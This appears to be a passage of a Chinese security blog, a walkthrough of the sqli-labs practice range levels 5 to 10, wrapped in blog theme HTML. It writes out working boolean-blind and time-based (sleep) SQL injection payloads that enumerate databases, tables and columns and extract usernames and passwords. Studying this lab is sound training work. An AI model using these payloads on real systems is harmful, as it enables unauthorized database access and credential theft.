+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php\">?id=1&#x27; and left((select column_name from information_schema.columns where table_name= &#x27;users&#x27; limit 4,1),8)=&#x27;username&#x27;--+<br></code></pre></td></tr></table></figure>
+<p>limit 4,1是username,limit 3,1是id<br>limit 5,1是password<br>最后一步就是<font color=red>猜值</font><br /> </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php\">?id=1’ and left((select password from users order by id limit 0,1),4)=‘dumb’ --+<br><br>?id=1’ and left((select username from users order by id limit 0,1),4)=‘dumb’ --+<br></code></pre></td></tr></table></figure>
+
+<h4 id="第六关"><a href="#第六关" class="headerlink" title="第六关:"></a>第六关:</h4><p>与第五关一样,就是前面的单引号闭合转换成了双引号闭合,这里就不阐述了.<br><font color=blue >上面的注入都是经过靶场亲自实验成功才写下来的,希望对你们有所帮助</font></p>
+<h4 id="第七关"><a href="#第七关" class="headerlink" title="第七关:"></a>第七关:</h4><p>第七关也是布尔盲驻,也是闭合符号不同,这里也再讲一下闭合符号的判断吧<br>先输入一个’<br><img src="https://img-blog.csdnimg.cn/20210407115520538.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMTQyMzY4,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br>发现报错,然后输入注释符号–+,发现还报错,说明不止是’,然后再输入),发现还是报错,说明还有东西,就再输入一个),发现就不再报错了,说明闭合符号就是<font color=red>‘))</font><br /><br>剩下的其实跟第五关一样</p>
+<h4 id="第八关"><a href="#第八关" class="headerlink" title="第八关:"></a>第八关:</h4><p>第八关跟第五关可以说差不多真的是一模一样,先判断闭合符号,发现输入 ‘ 报错,再输入–+,就不再报错,说明 ‘ 就是闭合符号,剩下的输入跟第五关一模一样,就没啥说的了</p>
+<h4 id="第九关"><a href="#第九关" class="headerlink" title="第九关:"></a>第九关:</h4><p>输入 ‘   “   发现都不报错,咱么就加一个sleep函数,</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php\">id=1&#x27; and sleep(5) --+<br></code></pre></td></tr></table></figure>
+<p>会发现,当输入的是id&#x3D;1’ 时,页面执行五秒后才刷新,而其他的注入都没这个效果,判断出闭合符号就是 ‘<br>这里开始sleep函数的注入,left函数在这一题中判断不出来,无论对错,都是对的</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php\">?id=1&#x27; and if(length(database())=8,sleep(5),1)--+    <br>页面延迟了五秒,数据库的长度就是8<br></code></pre></td></tr></table></figure>
+<p><font color=blue>猜数据库的名字</font></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php\">?id=1&#x27; and if(left(database(),1)=&#x27;s&#x27;,sleep(5),1)--+<br>&#x27;<br>&#x27;<br>?id=1&#x27; and if(left(database(),1)=&#x27;security&#x27;,sleep(5),8)--+<br></code></pre></td></tr></table></figure>
+<p><font color=blue>猜表的名字</font></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php\">?id=1&#x27; and if(left((select table_name from information_schema.tables where table_schema=database() limit 3,1),5)=&#x27;users&#x27;,sleep(5),5)--+<br></code></pre></td></tr></table></figure>
+<p><font color=blue>猜列的名字<font></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php\">?id=1&#x27; and if(left((select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 4,1),8)=&#x27;username&#x27;,sleep(5),1)--+<br></code></pre></td></tr></table></figure>
+<p>limit 5,1 是password<br><font color=blue>猜最后的值</font></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php\">?id=1’ and if(left((select password from users order by id limit 0,1),4)=‘dumb’ ,sleep(5),1)–+<br><br>?id=1’ and if(left((select username from users order by id limit 0,1),4)=‘dumb’ ,sleep(5),1)–+<br></code></pre></td></tr></table></figure>
+
+<h4 id="第十关"><a href="#第十关" class="headerlink" title="第十关:"></a>第十关:</h4><p>第十关就是在第九关的基础上,只是最前面的闭合符号从刚开始的 ‘ 变成了 “<br>其他的都不变!</p>
+<p>加油！<br><img src="https://img-blog.csdnimg.cn/20210407125517624.gif" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>SqlLabs</div>
+      <div>http://example.com/2023/04/20/SqlLabs/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>H0ne</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2023年4月20日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2023/04/20/SQL%E6%B3%A8%E5%85%A5/" title="SQL注入">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">SQL注入</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/04/20/SESSION%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="SESSION反序列化">
+                        <span class="hidden-mobile">SESSION反序列化</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+  
+<script src="//cdn.jsdelivr.net/gh/EmoryHuang/BlogBeautify@1.1/DynamicRibbon.min.js"></script>
+<script src="//cdn.jsdelivr.net/gh/EmoryHuang/BlogBeautify@1.1/DynamicLine.min.js"></script>
+<script src="//cdn.jsdelivr.net/gh/EmoryHuang/BlogBeautify@1.1/snowflake.min.js"></script>
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
